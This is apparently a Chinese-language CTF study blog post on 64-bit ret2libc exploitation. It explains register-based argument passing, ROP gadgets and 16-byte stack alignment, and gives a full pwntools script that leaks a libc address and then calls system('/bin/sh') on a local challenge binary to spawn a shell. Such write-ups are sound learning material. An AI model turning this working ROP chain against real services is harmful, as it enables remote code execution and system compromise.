---
layout: post
title: "[PWN]ret2libc(64位)学习笔记"
date: 2025-10-31
---

### 信息检查

这次是64位的ret2libc，做题前先把它的链接器和链接库改成题目给的。

![ref1](/assets/images/2025-10-31-ret2libc-x64-study-note/ref1.png)

再看看保护

![ref2](/assets/images/2025-10-31-ret2libc-x64-study-note/ref2.png)



### Ret2libc_x64

我们采取的策略依然是通过puts函数泄露出libc_start_main的地址，然后由版本和偏移算出基地址，再跳转回main函数重新执行，第二次发送getshell的payload。

64位和32位的不同点主要在于函数传参，32位的函数参数在返回地址后面，但是64位复杂的多，它依次使用RDI, RSI, RDX, RCX, R8 和 R9六个寄存器来传参，当参数个数大于六时，才使用栈传参。

因此当我们构造ROP链时，不仅需要把参数设置在栈上，还需要使用ROPgadget去找pop到相应寄存器的指令，这样寄存器才能把参数正确的传给函数。由于本次使用到的system、puts函数都只有一个参数，所以我们只用到pop rdi这个gadget传第一个参数就好，此外我们还需要ret，做栈对齐用。

![ref3](/assets/images/2025-10-31-ret2libc-x64-study-note/ref3.png)



### exp编写

exp编写如下

```python
#!/usr/bin/env python
from pwn import *

sh = process('./pwn')
ret2libc = ELF('./pwn')
libc = ELF('/home/kali/Desktop/ret2xxx/ret2libc_x64/libc-2.31.so')
puts_plt = ret2libc.plt['puts']
puts_got = ret2libc.got['puts']
libc_start_main_got = ret2libc.got['__libc_start_main']
main = ret2libc.symbols['main']

success("libc_start_main_got: {}".format(hex(libc_start_main_got)))
success("puts_got: {}".format(hex(puts_got)))

pop_rdi_ret=0x0000000000400753
ret=0x000000000040050e

payload = b'A' * 40 + p64(pop_rdi_ret) + p64(libc_start_main_got) + p64(ret) + p64(puts_plt) + p64(main)

sh.sendlineafter(b'Glad to meet you again!What u bring to me this time?', payload)

libc_start_main_addr = u64(sh.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
success("libc_start_main: {}".format(hex(libc_start_main_addr)))

libcbase = libc_start_main_addr - 0x0000000000023f90
success("libcbase: {}".format(hex(libcbase)))
system_addr = libcbase + libc.symbols['system']
success("system_addr: {}".format(hex(system_addr)))
binsh_addr = libcbase + next(libc.search(b'/bin/sh'))
success("binsh_addr: {}".format(hex(binsh_addr)))

success("pop_rdi_ret: {}".format(hex(pop_rdi_ret)))
success("ret: {}".format(hex(ret)))

payload = b'B' * 40 + p64(pop_rdi_ret) + p64(binsh_addr)  + p64(system_addr) + p64(0xdeadbeef)

sh.sendline(payload)
sh.interactive()

```

注意ROP链的构造顺序，这里和之前的ret2syscall很像，在调用函数前先把参数pop到寄存器里，而不是调用函数后才pop。

还有一个知识点叫栈对齐，栈对齐是指在函数调用时，栈指针（RSP）需要满足特定的内存地址对齐要求，函数调用时，栈指针必须是16字节对齐的，平常则是8字节对齐。注意看下面的情况，system函数的地址末尾是8，而下一个deadbeef的地址末尾是0，所以system函数并没有采用16字节的对齐方式，因此会调用失败，这里要调用成功需要把ret删了，让system函数的地址末尾是0。

![ref4](/assets/images/2025-10-31-ret2libc-x64-study-note/ref4.png)

栈对不对齐可以很轻松的检查出来，不对齐时运行到最后会有提示not aligned to 16 bytes。

![ref5](/assets/images/2025-10-31-ret2libc-x64-study-note/ref5.png)

前一段payload中加ret即是为了栈对齐，调试时可以看到栈的结构，由于有ret的存在，puts的调用是0x7ffec73984d0，所以是16字节的栈对齐的，可以正常调用，简单来说就是保证调用的函数的栈的末位地址是0就行。

![ref6](/assets/images/2025-10-31-ret2libc-x64-study-note/ref6.png)

运行exp后getshell

![ref7](/assets/images/2025-10-31-ret2libc-x64-study-note/ref7.png)
